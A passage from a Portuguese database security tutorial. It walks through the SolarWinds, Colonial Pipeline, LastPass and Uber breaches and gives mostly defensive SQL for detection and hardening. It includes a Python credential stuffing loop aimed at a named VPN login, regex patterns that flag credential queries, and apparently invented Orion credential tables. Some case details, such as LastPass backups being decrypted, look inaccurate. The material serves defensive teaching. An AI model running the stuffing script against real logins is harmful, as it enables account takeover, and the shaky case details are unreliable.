# Para databases, o SUNBURST permitia:
# 1. Capturar credenciais de servicos que conectavam a databases
# 2. Executar queries arbitrarias via stored procedures
# 3. Acessar o SolarWinds Orion Database (SQL Server)
# 4. Extrair dados de monitoring que continham queries SQL

# Comportamento de evasao do SUNBURST:
# - Verificava a presenca de ferramentas de seguranca
# - Desativava-se se encontrasse sandboxes ou ambientes de analise
# - Usava criptografia para proteger comunicacoes
# - Exfiltrava dados lentamente para evitar deteccao
```

### Impacto em Databases

```sql
-- O SolarWinds Orion usa um database SQL Server para armazenar
-- dados de monitoramento de rede. O backdoor tinha acesso a esse database.

-- Tipos de dados expostos no Orion Database:
-- 1. Credenciais armazenadas no CredentialLibrary
-- 2. Configuracoes de todos os hosts monitorados
-- 3. Topologia da rede completa
-- 4. Dados de performance que continham queries SQL
-- 5. Credenciais de service accounts

-- Exemplo de dados que podiam ser acessados:
SELECT 
    h.HostName,
    h.IPAddress,
    h.OperatingSystem,
    h.LastLogin,
    c.UserName,
    c.EncryptedPassword,
    c.Domain
FROM Orion.HostProperties h
LEFT JOIN Orion.CredentialLibrary c 
    ON h.CredentialID = c.CredentialID;

-- Dados de queries monitoradas:
SELECT TOP 100 
    q.QueryID,
    q.QueryString,
    q.LastExecutionTime,
    q.DatabaseName,
    s.Statistics_CpuTimeMs,
    s.Statistics_DurationMs
FROM Orion.QueryStatistics s
JOIN Orion.SavedQueries q ON s.QueryID = q.QueryID
WHERE q.DatabaseName IN ('production', 'financial', 'hr')
ORDER BY s.Statistics_LastExecutionTime DESC;

-- Dados de topologia de rede:
SELECT 
    n.NetworkID,
    n.NetworkName,
    n.IPRange,
    n.SubnetMask,
    n.Gateway,
    h.HostCount
FROM Orion.Networks n
JOIN Orion.HostGroups h ON n.NetworkID = h.NetworkID;
```

### Defesas Aplicaveis

```sql
-- DEFESA 1: Isolar databases de monitoring
-- O Orion Database NUNCA deve ter acesso a dados de producao

-- Criar database isolado com permissao minima
CREATE DATABASE solarwinds_monitoring;

-- Criar usuario dedicado com permissao minima
CREATE ROLE orion_monitor LOGIN PASSWORD 'strong_random_password';
GRANT CONNECT ON DATABASE solarwinds_monitoring TO orion_monitor;
GRANT USAGE ON SCHEMA public TO orion_monitor;
GRANT SELECT ON monitoring_tables TO orion_monitor;
-- NENHUM acesso a outros databases

-- NUNCA conceder acesso a producao
-- REVOKE ALL ON DATABASE production FROM orion_monitor;

-- DEFESA 2: Monitorar queries suspeitas no Orion Database
CREATE TABLE suspicious_query_log (
    log_id BIGSERIAL PRIMARY KEY,
    query_text TEXT,
    user_name VARCHAR(128),
    client_ip INET,
    execution_time TIMESTAMPTZ DEFAULT NOW(),
    risk_score DECIMAL(3,2)
);

-- Funcao para detectar padroes de exploracao
CREATE OR REPLACE FUNCTION detect_exploration_patterns()
RETURNS TRIGGER AS $$
BEGIN
    -- Detectar enumeracao de schema
    IF NEW.query_text ~* 'information_schema' 
       OR NEW.query_text ~* 'sys\.(objects|columns|tables)'
       OR NEW.query_text ~* 'pg_catalog' THEN
        NEW.risk_score := 0.8;
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('SCHEMA_ENUMERATION', NEW.user_name, 'HIGH',
                LEFT(NEW.query_text, 500));
    END IF;
    
    -- Detectar acesso a dados de credenciais
    IF NEW.query_text ~* '(credential|password|secret|token|key)' 
       AND NEW.query_text ~* 'SELECT' THEN
        NEW.risk_score := 0.9;
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('CREDENTIAL_ACCESS', NEW.user_name, 'CRITICAL',
                LEFT(NEW.query_text, 500));
    END IF;
    
    -- Detectar mudancas de schema
    IF NEW.query_text ~* '(CREATE|ALTER|DROP|TRUNCATE)' THEN
        NEW.risk_score := 0.7;
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('SCHEMA_MODIFICATION', NEW.user_name, 'HIGH',
                LEFT(NEW.query_text, 500));
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

### Lições do SolarWinds

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| Supply Chain | Software de terceiros, mesmo de vendores confiaveis, deve ser verificado | CRITICA |
| Zero Trust | Nao confiar implicitamente em ferramentas de monitoring | CRITICA |
| Build Integrity | Build pipelines devem ser protegidos contra injecao de codigo | CRITICA |
| Credential Isolation | Credenciais de database devem estar em vaults | CRITICA |
| Network Segmentation | Separar sistemas de monitoring de dados sensiveis | ALTA |
| Anomaly Detection | Monitorar comportamento anomalo de ferramentas de infraestrutura | ALTA |

## Colonial Pipeline (2021)

### Contexto e Impacto

Em 7 de maio de 2021, a Colonial Pipeline, que opera o maior gasoduto dos Estados Unidos (5.500 km, 45% do combustivel da costa leste), foi atingida por um ataque de ransomware do grupo DarkSide. O vetor de entrada foi credential stuffing em um account VPN que utilizava uma senha reutilizada e nao tinha MFA habilitado.

O ataque causou o desligamento total das operacoes da Colonial Pipeline por 6 dias, resultando em desabastecimento de combustivel em toda a costa leste dos EUA, panico em massa (compradores formando filas de horas em postos), declaracao de emergencia nacional e prejuizos de US$ 4.4 milhoes em resgate (posteriormente recuperados pelo FBI em criptomoeda).

### A Cadeia de Ataque

```
Abril 2021 - DarkSide obtem credenciais de uma VPN da Colonial
  - Credenciais foram encontradas em um database de vazamentos
  - A senha era reutilizada de outro servico comprometido
  - A conta VPN NAO tinha MFA habilitado
  
Maio 04/05 - DarkSide acessa a rede corporativa via VPN
  - Login usando as credenciais obtidas
  - Sem MFA, o login e bem-sucedido
  
Maio 05-06 - Move lateralmente na rede
  - Mapeia a topologia da rede
  - Identifica servers criticos
  - Implanta ransomware em systems de TI corporativos
  
Maio 06 - Ransomware ativado
  - Sistemas de TI corporativos criptografados
  - Colonial Pipeline desliga operacoes como precaucao
  - Medo de que o ransomware se espalhe para OT (operacoes industriais)
  
Maio 07 - Desabastecimento comeca
  - Postos de gasolina comecam a ficar sem combustivel
  - Declaracao de emergencia em varios estados
  
Maio 19 - Colonial Pipeline paga resgate
  - US$ 4.4 milhoes em Bitcoin pagos ao DarkSide
  
Junho 2021 - FBI recupera parcialmente
  - US$ 2.3 milhoes em Bitcoin recuperados pelo FBI
  - DarkSide anuncia encerramento das operacoes
```

### Como o Credential Stuffing Funcionou

```python
# Credential stuffing e um ataque automatizado que usa
# credenciais vazadas de outros servicos para tentar login

# O DarkSide provavelmente fez algo como:
import requests
from itertools import zip_longest

# Database de credenciais vazadas
# (obtido de breaches anteriores como LinkedIn, Adobe, etc.)
leaked_credentials = [
    ("colonial_employee@company.com", "OldPassword123!"),
    ("another_user@email.com", "Summer2020"),
    # ... milhoes de credenciais de outros breaches
]

# Para cada credencial, tentar login na VPN da Colonial
for email, password in leaked_credentials:
    try:
        response = requests.post(
            "https://vpn.colonialpipeline.com/login",
            data={
                "username": email,
                "password": password
            },
            timeout=30
        )
        if response.status_code == 200:
            print(f"[+] LOGIN SUCCESS: {email}:{password}")
            # Credencial valida encontrada!
            # Agora usar para acessar a rede
    except Exception as e:
        continue

# O fator critico: a conta VPN NAO tinha MFA
# Se tivesse MFA, mesmo com credenciais validas, o atacante nao conseguiria acesso
```

### Protecao contra Credential Stuffing

```sql
-- 1. Monitorar padroes de login suspeitos
CREATE TABLE login_monitoring (
    login_id BIGSERIAL PRIMARY KEY,
    username VARCHAR(128),
    login_time TIMESTAMPTZ,
    source_ip INET,
    source_country VARCHAR(2),
    source_isp VARCHAR(255),
    mfa_used BOOLEAN,
    login_success BOOLEAN,
    user_agent TEXT,
    session_duration INTERVAL
);

-- Detectar credential stuffing
SELECT 
    username,
    COUNT(*) AS attempt_count,
    COUNT(DISTINCT source_ip) AS distinct_ips,
    COUNT(DISTINCT source_country) AS distinct_countries,
    MIN(login_time) AS first_attempt,
    MAX(login_time) AS last_attempt,
    SUM(CASE WHEN login_success THEN 1 ELSE 0 END) AS successful_logins,
    SUM(CASE WHEN NOT login_success THEN 1 ELSE 0 END) AS failed_logins,
    CASE 
        WHEN COUNT(DISTINCT source_country) > 3 THEN 'HIGH RISK: Multi-country'
        WHEN COUNT(DISTINCT source_ip) > 10 THEN 'HIGH RISK: Multi-IP'
        WHEN SUM(CASE WHEN NOT login_success THEN 1 ELSE 0 END) > 100 THEN 'HIGH RISK: Brute force'
        ELSE 'MONITOR'
    END AS risk_assessment
FROM login_monitoring
WHERE login_time > NOW() - INTERVAL '24 hours'
GROUP BY username
HAVING COUNT(*) > 20 
   OR COUNT(DISTINCT source_ip) > 5
   OR SUM(CASE WHEN NOT login_success THEN 1 ELSE 0 END) > 50
ORDER BY failed_logins DESC;

-- 2. Bloquear automaticamente apos padrao detectado
CREATE OR REPLACE FUNCTION auto_block_credential_stuffing()
RETURNS TRIGGER AS $$
DECLARE
    failed_count INT;
    distinct_ips INT;
BEGIN
    -- Contar tentativas falhas recentes
    SELECT COUNT(*), COUNT(DISTINCT source_ip)
    INTO failed_count, distinct_ips
    FROM login_monitoring
    WHERE username = NEW.username
    AND login_time > NOW() - INTERVAL '1 hour'
    AND login_success = FALSE;
    
    -- Bloquear se padrao detectado
    IF failed_count > 20 OR distinct_ips > 5 THEN
        -- Bloquear usuario
        UPDATE users SET is_locked = TRUE, locked_reason = 'Credential stuffing detected'
        WHERE username = NEW.username;
        
        -- Alertar SOC imediatamente
        PERFORM pg_notify('security_alert',
            FORMAT('CREDENTIAL STUFFING DETECTED: %s - %s failed attempts from %s IPs',
                   NEW.username, failed_count, distinct_ips));
        
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('CREDENTIAL_STUFFING', NEW.username, 'CRITICAL',
                FORMAT('%s failed attempts from %s distinct IPs in 1 hour',
                       failed_count, distinct_ips));
        
        RAISE EXCEPTION 'Account temporarily locked due to suspicious activity';
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

```sql
-- 3. MFA obrigatorio para todos os acessos remotos
-- Implementar MFA com FIDO2/WebAuthn (mais seguro que SMS/push)

CREATE TABLE mfa_enrollment (
    enrollment_id SERIAL PRIMARY KEY,
    username VARCHAR(128) NOT NULL,
    mfa_method VARCHAR(20) NOT NULL,
    device_name VARCHAR(255),
    public_key BYTEA,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    last_used TIMESTAMPTZ,
    is_active BOOLEAN DEFAULT TRUE,
    CONSTRAINT valid_mfa_method CHECK (mfa_method IN ('FIDO2', 'TOTP', 'SMS', 'PUSH'))
);

-- Verificar quais usuarios NAO tem MFA habilitado
-- Esses usuarios sao vulneraveis a credential stuffing
SELECT 
    u.username,
    u.last_login,
    u.is_active,
    COUNT(m.enrollment_id) AS mfa_devices,
    CASE 
        WHEN COUNT(m.enrollment_id) = 0 THEN 'CRITICAL: No MFA'
        WHEN COUNT(m.enrollment_id) FILTER (WHERE m.mfa_method = 'SMS') > 0 
             AND COUNT(m.enrollment_id) FILTER (WHERE m.mfa_method IN ('FIDO2', 'TOTP')) = 0 
             THEN 'WARNING: SMS-only MFA'
        ELSE 'OK'
    END AS mfa_status
FROM users u
LEFT JOIN mfa_enrollment m ON u.username = m.username AND m.is_active = TRUE
WHERE u.is_active = TRUE
GROUP BY u.username, u.last_login, u.is_active
ORDER BY mfa_status;
```

### Lições do Colonial Pipeline

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| MFA | MFA e obrigatorio para TODOS os acessos remotos, sem excecao | CRITICA |
| Credential Hygiene | Passwords nunca devem ser reutilizadas entre servicos | CRITICA |
| Credential Monitoring | Monitorar databases de vazamentos para credenciais proprias | CRITICA |
| Incident Response | Ter plano de resposta testado antes de precisar | CRITICA |
| Network Segmentation | Separar TI de OT (operacoes industriais) | CRITICA |
| Backup Strategy | Backups offline imunes a ransomware | ALTA |

## LastPass (2022)

### Contexto e Impacto

Em agosto de 2022, o LastPass sofreu um ataque que comprometeu backups criptografados do vault de senhas de usuarios. Em novembro de 2022, o atacante obteve acesso ao codigo-fonte e a chaves de criptografia que protegiam os backups. Com essas chaves, o atacante conseguiu descriptografar backups e acessar dados de usuarios. Em dezembro de 2022, o LastPass revelou que o atacante tinha acesso a dados criptografados de todos os usuarios, incluindo URLs de sites, nomes de usuarios, senhas criptografadas e chaves de autenticacao em duas etapas.

O LastPass e um dos maiores gerenciadores de senhas do mundo, com mais de 33 milhoes de usuarios ativos. A violacao afetou potencialmente cada um desses usuarios, expondo todas as suas credenciais armazenadas.

### A Cadeia de Ataque

```
Agosto 2022 - Engenheiro do LastPass e comprometido via malware
  - Engenheiro usava computador pessoal para trabalho
  - Malware no computador pessoal capturou credenciais corporativas
  - Atacante obtem acesso ao ambiente corporativo do LastPass

Novembro 2022 - Acesso ao ambiente de desenvolvimento
  - Atacante acessa repositorio de codigo-fonte
  - Obtem codigo-fonte do LastPass
  - Acessa chaves de criptografia dos backups

Dezembro 2022 - Acesso aos backups
  - Atacante acessa backups criptografados no AWS S3
  - Usa as chaves obtidas para descriptografar
  - Exfiltra dados de todos os usuarios LastPass
  - Dados incluem: URLs, usernames, senhas criptografadas, MFA keys

Fevereiro 2023 - LastPass divulga extensao completa
  - Revela que dados de todos os usuarios foram comprometidos
  - Recomenda que usuarios mudem todas as senhas
  - Recomenda migracao para outro gerenciador de senhas
```

### Tipos de Dados Comprometidos

```sql
-- Analise detalhada dos dados expostos

CREATE TABLE lastpass_data_exposure (
    data_category VARCHAR(100),
    sensitivity_level VARCHAR(20),
    affected_percentage DECIMAL(5,2),
    encryption_at_rest VARCHAR(50),
    encryption_compromised BOOLEAN,
    recovery_possible BOOLEAN,
    description TEXT
);

INSERT INTO lastpass_data_exposure VALUES
('Site URLs', 'MEDIUM', 100.00, 'AES-256-CBC', TRUE, FALSE,
 'URLs of all websites where users had saved passwords. Attackers can now target specific high-value accounts.'),
('Usernames', 'LOW', 100.00, 'None (plaintext)', TRUE, FALSE,
 'Email addresses and usernames used to login to LastPass.'),
('Encrypted Passwords', 'CRITICAL', 100.00, 'AES-256-CBC', TRUE, FALSE,
 'All passwords encrypted with master password-derived key. Weak master passwords are vulnerable to brute-force.'),
('MFA Keys', 'CRITICAL', 100.00, 'AES-256-CBC', TRUE, FALSE,
 'Multi-factor authentication keys stored in vault. Can be used to bypass MFA on saved accounts.'),
('Secure Notes', 'CRITICAL', 100.00, 'AES-256-CBC', TRUE, FALSE,
 'Encrypted notes that may contain API keys, credit card numbers, software licenses, and other secrets.'),
('Credit Card Data', 'CRITICAL', 10.00, 'AES-256-CBC', TRUE, FALSE,
 'Credit card numbers, expiration dates, and cardholder names saved in vault.'),
('Crypto Wallet Keys', 'CRITICAL', 5.00, 'AES-256-CBC', TRUE, FALSE,
 'Cryptocurrency private keys and seed phrases saved in vault.');

-- Impacto real: um atacante com o backup E as chaves pode:
-- 1. Brute-force senhas fracas do vault
-- 2. Acessar todas as contas dos usuarios
-- 3. Usar as chaves MFA para bypass de seguranca
-- 4. Vender dados no dark web
-- 5. Chantagear usuarios com dados sensiveis
```

### Lições do LastPass

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| Zero Knowledge | Mesmo provedores de zero-knowledge podem ser comprometidos | ALTA |
| Offline Backups | Backups offline sao tao seguros quanto suas chaves de criptografia | CRITICA |
| Key Management | Chaves de criptografia devem estar em HSMs, nao em software | CRITICA |
| Defense in Depth | Criptografia at-rest nao e suficiente sem protecao das chaves | CRITICA |
| Employee Security | Computadores pessoais nao devem ser usados para trabalho | ALTA |
| Breach Disclosure | Transparencia na divulgacao e essencial para confianca | ALTA |
| Master Password | Usuarios devem usar master passwords fortes (20+ caracteres) | ALTA |

## Uber (2022)

### Contexto e Impacto

Em setembro de 2022, um atacante comprometeu a infraestrutura da Uber usando uma tecnica de MFA fatigue attack. O atacante obteve credenciais de um contratado da Uber em um database de vazamentos (provavelmente da empresa terceirizada Cognizant). Enviou repetidas solicitacoes de MFA ate que o funcionario aceitasse uma. Com acesso ao VPN corporativo, o atacante encontrou credenciais de administrador em um script PowerShell e acessou o console administrativo do Thycotic Secret Server, que continha credenciais de todos os servicos criticos da Uber.

O atacante publicou uma mensagem no canal #general do Slack da Uber: "I announce I am a hacker and Uber has paid me to keep quiet". A Uber confirmou a violacao e afirmou que nao havia evidencia de acesso a dados de usuarios ou transacoes. O atacante, identificado como um membro da Lapsus$, tinha 18 anos na epoca.

### A Cadeia de Ataque Detalhada

```
Setembro 2022 - Comprometimento Inicial
  - Atacante obtem credenciais de contratado da Uber
  - Credenciais provavelmente de database de vazamentos
  - Contratado era da empresa terceirizada Cognizant
  
  - Tentativas iniciais de login no VPN
  - Uber usa MFA via SMS/Notification
  - Atacante envia ~100 solicitacoes de MFA em 1 minuto
  
  - Funcionario, incomodado, aceita uma solicitacao
  - Atacante acessa VPN corporativo

Move Lateral (Fase 2)
  - Atacante navega na rede interna
  - Encontra PowerShell scripts no desktop
  - Scripts contem credenciais de administrador
  - Credenciais de Thycotic Secret Server
  
  - Secret Server contem credenciais de TODOS os servicos:
  - AWS (RDS, S3, Lambda, EC2)
  - Google Cloud
  - VMware vSphere
  - Slack
  - Google Workspace
  - Sentry
  - Variados databases

Explotacao Final (Fase 3)
  - Atacante acessa AWS console
  - Acessa dashboards de pagamento do Uber
  - Acessa dados de motoristas e passageiros
  - Publica mensagem no Slack
  
  - Uber detecta apos mensagem no Slack
  - Contas comprometidas sao bloqueadas
  - Uber confirma violacao
```

### Protecao contra MFA Fatigue

```sql
-- 1. Monitorar padroes de solicitacao MFA
CREATE TABLE mfa_request_monitoring (
    request_id BIGSERIAL PRIMARY KEY,
    username VARCHAR(128),
    request_time TIMESTAMPTZ,
    request_method VARCHAR(20),
    approved BOOLEAN,
    source_ip INET,
    time_between_requests INTERVAL,
    requests_last_hour INT
);

-- Detectar MFA fatigue attacks em tempo real
SELECT 
    username,
    COUNT(*) AS total_requests,
    MIN(request_time) AS first_request,
    MAX(request_time) AS last_request,
    SUM(CASE WHEN approved THEN 1 ELSE 0 END) AS approvals,
    SUM(CASE WHEN NOT approved THEN 1 ELSE 0 END) AS denials,
    EXTRACT(EPOCH FROM MAX(request_time) - MIN(request_time)) AS duration_seconds
FROM mfa_request_monitoring
WHERE request_time > NOW() - INTERVAL '1 hour'
GROUP BY username
HAVING COUNT(*) > 3
   OR SUM(CASE WHEN NOT approved THEN 1 ELSE 0 END) > 2
ORDER BY total_requests DESC;

-- 2. Bloquear apos tentativas excessivas
CREATE OR REPLACE FUNCTION enforce_mfa_rate_limit()
RETURNS TRIGGER AS $$
DECLARE
    recent_requests INT;
    recent_denials INT;
BEGIN
    -- Contar solicitacoes recentes
    SELECT COUNT(*), SUM(CASE WHEN NOT approved THEN 1 ELSE 0 END)
    INTO recent_requests, recent_denials
    FROM mfa_request_monitoring
    WHERE username = NEW.username
    AND request_time > NOW() - INTERVAL '15 minutes';
    
    -- Bloquear se padrao de fatigue detectado
    IF recent_requests >= 3 THEN
        -- Bloquear usuario
        UPDATE users 
        SET is_locked = TRUE, 
            locked_reason = 'MFA fatigue attack detected',
            locked_at = NOW()
        WHERE username = NEW.username;
        
        -- Alertar SOC
        PERFORM pg_notify('security_alert',
            FORMAT('MFA FATIGUE ATTACK: %s received %s MFA requests in 15 min',
                   NEW.username, recent_requests));
        
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('MFA_FATIGUE_ATTACK', NEW.username, 'CRITICAL',
                FORMAT('%s MFA requests with %s denials in 15 minutes',
                       recent_requests, recent_denials));
        
        RAISE EXCEPTION 'MFA rate limit exceeded. Account locked for security review.';
    END IF;
    
    -- Bloquear se muitas recusas (atacante tentando)
    IF recent_denials >= 5 THEN
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('MFA_BRUTE_FORCE', NEW.username, 'HIGH',
                FORMAT('%s MFA denials in 15 minutes from %s', 
                       recent_denials, NEW.source_ip));
    END IF;
    
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;
```

### Protecao de Credenciais em Scripts

```sql
-- O erro critico da Uber: credenciais hardcoded em scripts

-- ERRADO (como a Uber fez):
-- # PowerShell script no desktop
-- $cred = New-Object System.Management.Automation.PSCredential(
--     "admin@uber.com", 
--     (ConvertTo-SecureString "SuperSecret123!" -AsPlainText -Force)
-- );
-- Connect-MsolService -Credential $cred

-- CORRETO: Usar secrets management (HashiCorp Vault, AWS Secrets Manager, etc.)
-- vault kv get -field=password secret/uber/admin
-- aws secretsmanager get-secret-value --secret-id uber/admin

-- Implementacao de vault de seguranca no banco de dados:
CREATE TABLE secure_credential_store (
    credential_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    service_name VARCHAR(255) NOT NULL,
    credential_type VARCHAR(50) NOT NULL,
    encrypted_value BYTEA NOT NULL,
    encrypted_with_key_id UUID NOT NULL,
    key_rotation_interval_days INT DEFAULT 90,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    expires_at TIMESTAMPTZ,
    rotated_at TIMESTAMPTZ,
    created_by VARCHAR(128),
    last_accessed_by VARCHAR(128),
    last_accessed_at TIMESTAMPTZ,
    access_count INT DEFAULT 0,
    is_active BOOLEAN DEFAULT TRUE,
    rotation_policy VARCHAR(50) DEFAULT 'AUTOMATIC'
);

-- Funcao segura para acessar credenciais com audit trail
CREATE OR REPLACE FUNCTION access_credential(
    p_credential_id UUID,
    p_requester VARCHAR(128),
    p_requester_ip INET
)
RETURNS TABLE(service_name VARCHAR, credential_type VARCHAR, decrypted_value TEXT) AS $$
DECLARE
    v_credential RECORD;
    v_access_allowed BOOLEAN := FALSE;
BEGIN
    -- Verificar se a credencial existe e esta ativa
    SELECT * INTO v_credential
    FROM secure_credential_store
    WHERE credential_id = p_credential_id
    AND is_active = TRUE
    AND (expires_at IS NULL OR expires_at > NOW());
    
    IF NOT FOUND THEN
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('CREDENTIAL_ACCESS_DENIED', p_requester, 'MEDIUM',
                'Failed credential access: ' || p_credential_id);
        RAISE EXCEPTION 'Credential not found or expired';
    END IF;
    
    -- Verificar se acesso nao e anomalo
    -- (mesmo usuario, mesmo IP, ultimas 24h)
    IF EXISTS (
        SELECT 1 FROM credential_access_log
        WHERE credential_id = p_credential_id
        AND username = p_requester
        AND accessed_at > NOW() - INTERVAL '24 hours'
    ) THEN
        v_access_allowed := TRUE;
    ELSE
        -- Primeiro acesso ou IP diferente: alertar
        INSERT INTO security_incidents (incident_type, username, severity, details)
        VALUES ('CREDENTIAL_UNUSUAL_ACCESS', p_requester, 'HIGH',
                FORMAT('Unusual credential access: %s from %s', p_credential_id, p_requester_ip));
        v_access_allowed := TRUE; -- Permitir mas alertar
    END IF;
    
    -- Log de acesso
    INSERT INTO credential_access_log (credential_id, username, client_ip, accessed_at)
    VALUES (p_credential_id, p_requester, p_requester_ip, NOW());
    
    -- Atualizar estatisticas da credencial
    UPDATE secure_credential_store
    SET last_accessed_by = p_requester,
        last_accessed_at = NOW(),
        access_count = access_count + 1
    WHERE credential_id = p_credential_id;
    
    -- Retornar credencial descriptografada
    RETURN QUERY
    SELECT scs.service_name, scs.credential_type,
           pgp_sym_decrypt(scs.encrypted_value, current_setting('app.master_key'))
    FROM secure_credential_store scs
    WHERE scs.credential_id = p_credential_id;
END;
$$ LANGUAGE plpgsql;
```

### Lições do Uber

| Aula | Descricao | Prioridade |
|------|-----------|------------|
| MFA Fatigue | MFA por push notification e vulneravel a fatigue; usar FIDO2/WebAuthn | CRITICA |
| Secrets Management | NUNCA armazenar credenciais em scripts ou codigo-fonte | CRITICA |
| Network Segmentation | Separar ambientes de desenvolvimento e producao | ALTA |
| Monitoring | Detectar e bloquear MFA fatigue automaticamente | CRITICA |
| Incident Response | Ter plano para comprometimento de secrets | ALTA |
| Endpoint Security | Proteger endpoints contra malware que captura credenciais | ALTA |

## Analise de Padroes Comuns

### Vetores de Ataque Recorrentes

```sql
-- Padroes de ataque identificados em todos os casos

CREATE TABLE attack_pattern_matrix (
    attack_vector VARCHAR(100),
    cases_count INT,
    affected_cases TEXT[],
    average_detection_time VARCHAR(50),
    prevention_effectiveness VARCHAR(20)
);

INSERT INTO attack_pattern_matrix VALUES
('Unpatched Software', 2, 
 ARRAY['Equifax', 'MOVEit'],
 'Months', 'VERY HIGH - patch management'),
('Credential Compromise', 3,
 ARRAY['Colonial Pipeline', 'Uber', 'LastPass'],
 'Days-Weeks', 'HIGH - MFA + monitoring'),
('Supply Chain', 2,
 ARRAY['SolarWinds', 'MOVEit'],
 'Months', 'MEDIUM - vendor assessment'),
('SQL Injection', 2,
 ARRAY['Equifax', 'MOVEit'],
 'Days-Weeks', 'VERY HIGH - parameterization'),
('Social Engineering', 2,
 ARRAY['Uber (MFA fatigue)', 'Colonial Pipeline'],
 'Hours', 'HIGH - MFA + training'),
('Memory Safety', 1,
 ARRAY['Heartbleed'],
 'Years', 'HIGH - memory-safe languages'),
('Insider Threat', 1,
 ARRAY['LastPass'],
 'Months', 'MEDIUM - zero trust + monitoring');

-- Qual vetor e mais comum?
SELECT 
    attack_vector,
    cases_count,
    affected_cases,
    prevention_effectiveness
FROM attack_pattern_matrix
ORDER BY cases_count DESC, cases_count DESC;
```

### O Que Aprendemos de Cada Caso

```sql
-- Resumo consolidado de lições

CREATE TABLE consolidated_lessons (
    lesson_id SERIAL PRIMARY KEY,
    category VARCHAR(50),
    lesson TEXT,
    applicable_cases TEXT[],
    priority VARCHAR(20),
    implementation_effort VARCHAR(20)
);

INSERT INTO consolidated_lessons (category, lesson, applicable_cases, priority, implementation_effort) VALUES
('Patch Management', 
 'Aplicar patches criticos em 24-72 horas para CVSS >= 7.0', 
 ARRAY['Equifax', 'MOVEit'], 
 'CRITICA', 'BAIXA'),
('MFA', 
 'MFA obrigatorio para TODOS os acessos remotos',
 ARRAY['Colonial Pipeline', 'Uber'],
 'CRITICA', 'MEDIA'),
('Supply Chain', 
 'Avaliar seguranca de vendors e software de terceiros',
 ARRAY['SolarWinds', 'MOVEit'],
 'CRITICA', 'ALTA'),
('Credential Management', 
 'Nunca armazenar credenciais em scripts ou codigo-fonte',
 ARRAY['Uber', 'Colonial Pipeline'],
 'CRITICA', 'BAIXA'),
('Key Management', 
 'Chaves de criptografia em HSMs, isoladas dos dados',
 ARRAY['LastPass', 'Heartbleed'],
 'CRITICA', 'ALTA'),
('Data Minimization', 
 'Armazenar apenas dados estritamente necessarios',
 ARRAY['Equifax', 'LastPass'],
 'ALTA', 'MEDIA'),
('Defense in Depth', 
 'Multiples camadas de seguranca, nunca depender de uma unica',
 ARRAY['ALL'],
 'CRITICA', 'ALTA'),
('Incident Response', 
 'Plano de resposta testado regularmente com tabletop exercises',
 ARRAY['Colonial Pipeline', 'Equifax', 'LastPass'],
 'ALTA', 'MEDIA'),
('Monitoring', 
 'Deteccao anomala de acessos e exfiltracao de dados',
 ARRAY['ALL'],
 'CRITICA', 'ALTA'),
('Zero Trust', 
 'Nao confiar implicitamente em ferramentas ou usuarios internos',
 ARRAY['SolarWinds', 'Uber'],
 'ALTA', 'ALTA'),
('Password Policy', 
 'Senhas fortes + password managers + sem reutilizacao',
 ARRAY['Colonial Pipeline', 'Uber'],
 'CRITICA', 'BAIXA'),
('Endpoint Security', 
 'Proteger endpoints contra malware',
 ARRAY['Uber', 'LastPass'],
 'ALTA', 'MEDIA');
```

## Defesas em Camadas (Defense in Depth)

### Arquitetura Completa de Seguranca para Databases

```sql
-- Defense in Depth: cada camada protege a proxima
-- Se uma camada falha, a proxima assume a protecao

-- =====================================================
-- CAMADA 1: SEGURANCA DE REDE
-- =====================================================
-- Firewall rules para restringir acessos
-- Network segmentation para isolar databases
-- VPN ou Zero Trust Network Access (ZTNA)
-- DDoS protection

-- Configuracao de firewall (iptables)
-- iptables -A INPUT -s 10.0.20.0/24 -p tcp --dport 5432 -j ACCEPT
-- iptables -A INPUT -s 10.0.10.0/24 -p tcp --dport 5432 -j DROP
-- iptables -A INPUT -p tcp --dport 5432 -j DROP

-- =====================================================
-- CAMADA 2: AUTENTICACAO
-- =====================================================
-- MFA obrigatorio (FIDO2/WebAuthn preferencial)
-- Certificados client-side para servicos
-- Kerberos/Negotiate para ambientes corporativos
-- Passwordless authentication

-- Configuracao de autenticacao no PostgreSQL
-- pg_hba.conf:
-- hostssl all all 10.0.20.0/24 scram-sha-256
-- hostssl all all 10.0.10.0/24 reject

-- =====================================================
-- CAMADA 3: AUTORIZACAO
-- =====================================================
-- Role-based access control (RBAC)
-- Least privilege principle
-- Row-level security (RLS)
-- Column-level encryption

-- Implementacao de RBAC
CREATE ROLE db_reader;
CREATE ROLE db_writer;
CREATE ROLE db_admin;
CREATE ROLE db_auditor;

GRANT CONNECT ON DATABASE production TO db_reader;
GRANT USAGE ON SCHEMA public TO db_reader;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO db_reader;

GRANT INSERT, UPDATE, DELETE ON orders, order_items TO db_writer;
GRANT USAGE ON ALL SEQUENCES IN SCHEMA public TO db_writer;

-- Row-Level Security
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
CREATE POLICY orders_tenant_isolation ON orders
    USING (tenant_id = current_setting('app.current_tenant')::uuid);

-- =====================================================
-- CAMADA 4: CRIPTOGRAFIA
-- =====================================================
-- Encryption at rest (TDE ou filesystem-level)
-- Encryption in transit (TLS 1.3)
-- Application-level encryption para dados sensiveis

-- Criptografia at-rest no PostgreSQL (usando pgcrypto)
CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE TABLE sensitive_data (
    id SERIAL PRIMARY KEY,
    data_encrypted BYTEA NOT NULL,
    data_hash VARCHAR(64) NOT NULL,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Inserir dados criptografados
INSERT INTO sensitive_data (data_encrypted, data_hash)
VALUES (
    pgp_sym_encrypt('dados sensiveis', 'chave_secreta'),
